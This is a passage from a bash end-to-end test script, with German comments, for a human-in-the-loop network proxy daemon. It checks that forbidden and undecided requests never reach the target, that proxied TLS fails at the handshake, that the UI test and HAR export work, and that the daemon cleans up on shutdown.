       | select(.flow_id as $id | $batch | index($id) != null)
       | select(.decision == "allow" and .rule_id == "")]
    | length')
e2e_expect "and twelve by a human, each without a rule behind it" 12 "$by_human"

# --- 9. Was das Ziel selbst gesehen hat --------------------------------------

e2e_step "9. the counter-check at the target"

# Die Gegenprobe zu allem, am selben Ziel. Bedient hat es sechzehn Anfragen:
# die Erreichbarkeits-Probe, die vierzehn, die ein Mensch oder seine Regel
# erlaubt hat, und die positive TLS-Kontrolle aus Schritt 7 — und keine einzige
# darüber hinaus. Was ein Mensch verboten hat, steht null Mal in seinem
# Protokoll; was niemand entschieden hat, ebenso wenig; und die TLS-Anfrage
# durch den Proxy kam nie über den Handschlag hinaus.
served=$(grep -c ' 200 [0-9]*$' "$M2_UPSTREAM_LOG" || true)
e2e_expect "the target served the two probes and the fourteen allowed requests" \
    16 "$served"
e2e_expect "and never the request a human forbade" 0 "$(m2_upstream_hits '/exfil')"
e2e_expect "and never the one nobody decided" 0 "$(m2_upstream_hits '/repos/x/y')"

# Und die Anfrage durch den Proxy kam nie über den Handschlag hinaus. Eine
# Suche nach `/tls-probe` im Protokoll wäre dafür keine Prüfung: Scheitert der
# Handschlag, schreibt das Ziel überhaupt keine Zeile, die Zahl wäre also aus
# strukturellen Gründen null und könnte gar nicht anders ausfallen. Gezählt
# werden deshalb die TLS-Anfragen, die das Ziel bedient hat — es muss genau
# eine sein, und zwar die Kontrolle. Vertraute der Daemon der Testwurzel, käme
# eine zweite dazu, und diese Zahl fiele um.
tls_served=$(awk '$2 == "https" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")
e2e_expect "the target served exactly one TLS request" 1 "$tls_served"
e2e_expect "and it was the control, not the one that went through the proxy" \
    "$M2_PATH_TLS_CONTROL" \
    "$(awk '$2 == "https" { print $5 }' "$M2_UPSTREAM_LOG")"

# --- 10. Die Oberfläche ------------------------------------------------------

e2e_step "10. the screen shows the same run"

if [ "${M2_UI:-auto}" = 0 ]; then
    e2e_say "M2_UI=0: the screen half is switched off for this run"
elif [ ! -f "$M2_UI_TEST" ]; then
    e2e_say "SKIPPED: $M2_UI_TEST does not exist yet (HUM-036, screen half)."
    e2e_say "         Nothing about the screen and nothing about the HAR export was verified."
    if [ "${M2_UI:-auto}" = 1 ]; then
        e2e_die "M2_UI=1 was asked for, but the integration test of the screen is not there"
    fi
else
    command -v flutter > /dev/null 2>&1 ||
        e2e_die "the integration test of the screen is there but flutter is not on PATH"
    command -v xvfb-run > /dev/null 2>&1 ||
        e2e_die "the integration test of the screen is there but xvfb-run is not on PATH"
    # Der Bildschirm bekommt genau den XDG-Baum, in dem der Daemon dieses Laufs
    # Socket, Token und CA abgelegt hat. `XDG_RUNTIME_DIR` allein genügt dafür:
    # `DaemonPaths.resolve` in `app/lib/core/ipc/daemon_paths.dart` leitet
    # Socket und Token daraus ab, genau wie `humanitl_config::Paths` es auf der
    # Rust-Seite tut. `HUMANITL_SOCKET` und `HUMANITL_TOKEN` stehen daneben,
    # damit ein Test die beiden Pfade nehmen kann, ohne sie noch einmal
    # herzuleiten; `HUMANITL_E2E_HAR` sagt, wohin die Export-Datei gehört.
    # Die Auflösung ist Absicht — unter 1400x900 greift das schmale Layout, und
    # die Selektoren des Tests fänden ihre Elemente nicht.
    (
        cd "$E2E_ROOT/app" &&
            XDG_RUNTIME_DIR="$E2E_XDG_RUNTIME" \
                XDG_DATA_HOME="$E2E_XDG_DATA" \
                XDG_CONFIG_HOME="$E2E_XDG_CONFIG" \
                HOME="$E2E_HOME" \
                HUMANITL_SOCKET="$DAEMON_SOCK" \
                HUMANITL_TOKEN="$DAEMON_TOKEN" \
                HUMANITL_E2E_HAR="$M2_HAR" \
                xvfb-run -a --server-args='-screen 0 1600x1000x24' \
                flutter test integration_test/m2_first_decision_test.dart -d linux
    ) || e2e_die "the integration test of the screen failed"
    if [ -s "$M2_HAR" ]; then
        e2e_check "the screen wrote the HAR export" ok
    else
        e2e_check "the screen wrote the HAR export" no "$M2_HAR is missing or empty"
    fi
    e2e_expect "the export holds every request of the run" 17 \
        "$(jq -r '.log.entries | length' "$M2_HAR")"
fi

# --- Der geordnete Abschied --------------------------------------------------

e2e_step "the daemon leaves nothing behind"

# Erst der Nachweis, dass es die drei überhaupt gibt. Ohne ihn bestünden die
# drei Zusicherungen darunter auch dann, wenn der Daemon sie nie angelegt
# hätte — dieselbe Klasse von Prüfung, die aus zwei Gründen halten kann.
if [ -S "$DAEMON_SOCK" ] && [ -f "$DAEMON_TOKEN" ] && [ -S "$DAEMON_PROXY_SOCK" ]; then
    e2e_check "socket, token and proxy socket are there while the daemon runs" ok
else
    e2e_check "socket, token and proxy socket are there while the daemon runs" no \
        "socket=$([ -S "$DAEMON_SOCK" ] && echo yes || echo no) token=$([ -f "$DAEMON_TOKEN" ] && echo yes || echo no) proxy=$([ -S "$DAEMON_PROXY_SOCK" ] && echo yes || echo no)"
fi

stop_daemon
[ ! -e "$DAEMON_SOCK" ] ||
    e2e_check "SIGTERM removes the daemon socket" no "$DAEMON_SOCK is still there"
e2e_check "SIGTERM removes the daemon socket" ok
[ ! -e "$DAEMON_TOKEN" ] ||
    e2e_check "SIGTERM removes the token" no "$DAEMON_TOKEN is still there"
e2e_check "SIGTERM removes the token" ok
[ ! -e "$DAEMON_PROXY_SOCK" ] ||
    e2e_check "SIGTERM ends the proxy session" no "$DAEMON_PROXY_SOCK is still there"
e2e_check "SIGTERM ends the proxy session" ok

# --- Die Selbstprüfung -------------------------------------------------------

e2e_step "the run checks itself"

# Ein Lauf, der grün ist, weil ein Zweig übersprungen wurde, wäre schlimmer als
# gar keiner. Der Zähler steht in `lib.sh` und wächst mit jeder geprüften
# Behauptung, gleich ob sie hielt.
if [ "$E2E_ASSERTIONS" -lt "$M2_EXPECTED_ASSERTIONS" ]; then
    e2e_die "only $E2E_ASSERTIONS of $M2_EXPECTED_ASSERTIONS assertions ran; a branch was skipped"
fi
if [ "$E2E_ASSERTIONS" -gt "$M2_EXPECTED_ASSERTIONS" ]; then
    e2e_say "note: $E2E_ASSERTIONS assertions ran, $M2_EXPECTED_ASSERTIONS were expected;"
    e2e_say "      raise M2_EXPECTED_ASSERTIONS in this script so the number keeps its meaning"
fi
e2e_say "$E2E_ASSERTIONS assertions checked"

echo
echo "M2 demo: OK"
